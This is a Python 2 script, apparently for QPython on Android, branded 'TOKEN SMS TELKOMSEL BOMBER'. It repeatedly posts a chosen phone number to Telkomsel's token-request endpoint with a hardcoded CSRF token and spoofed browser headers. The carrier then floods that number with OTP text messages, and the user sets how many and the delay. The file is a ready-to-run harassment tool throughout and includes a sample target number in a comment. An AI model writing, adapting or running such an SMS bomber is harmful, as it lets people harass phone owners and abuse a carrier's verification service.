#-*-coding:utf8;-*-
#qpy:2
#qpy:console

print "This is console module"
import requests
import time
import json
import os

def tlkom(n,t, j):
    counter = 0
    while counter <= j:
        counter += 1
        print "\nPesan Ke: %s\nKirim ke: %s\n" % (counter, n)
        url = "https://mobi.telkomsel.com/ulang/token"
        data = {"ci_csrf_token":"daaac6aa63d46b9709f0e3d054a65c9b&","msisdn":n}
        headers = {"Referer":"https://mobi.telkomsel.com/ulang?ch=WEB",
                   "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}
        r = requests.post(url,data=data, headers=headers)  
        parsing = json.loads(r.text)
        if parsing[u"status"] == u"1":
            print " SUCCES : ", n
        else:
            print " GAGAL KE ", n
        time.sleep(t)
    print "Selesai"
if __name__ == "__main__":
    os.system("clear")
    #no = raw_input("Nomor: ")
    #jml = int(raw_input("Jumlah Flood: "))
    #timeout = int(raw_input("Delay/Jeda: "))
    print "-".join("|"*18)
    print "\t-TOKEN SMS TELKOMSEL BOMBER"
    print "\t-Made by Dandy Raka"
    print "\t-Python Coding: Qiuby Zhukhi"
    print "\t--[PBM]-- TEAM 100% BAXOT"
    print "-".join("|"*18)
    print "\n"
#Ini kalau mau isi lewat terminal input metode
    no = raw_input("Nomor: ")
    jml = int(raw_input("Jumlah Flood: "))
    timeout = int(raw_input("Delay/Jeda: "))
    """
    Dibawah ini kalau mau isi lewat code langsung.
    kalau pake ini,
    Hapus 3 Tanda tagar (#) dan hapus Variabel script no,jum,timeout serta isinya
    yang terletak tepat di atas pesan ini.
    """
#    no = "+6282259071376" # Nomor HP
#    jml = 1 #flood
#    timeout = 1 # jeda
    requests = requests.session()
    tlkom(no, timeout, jml)
else:
    print "Tadaaaa :v"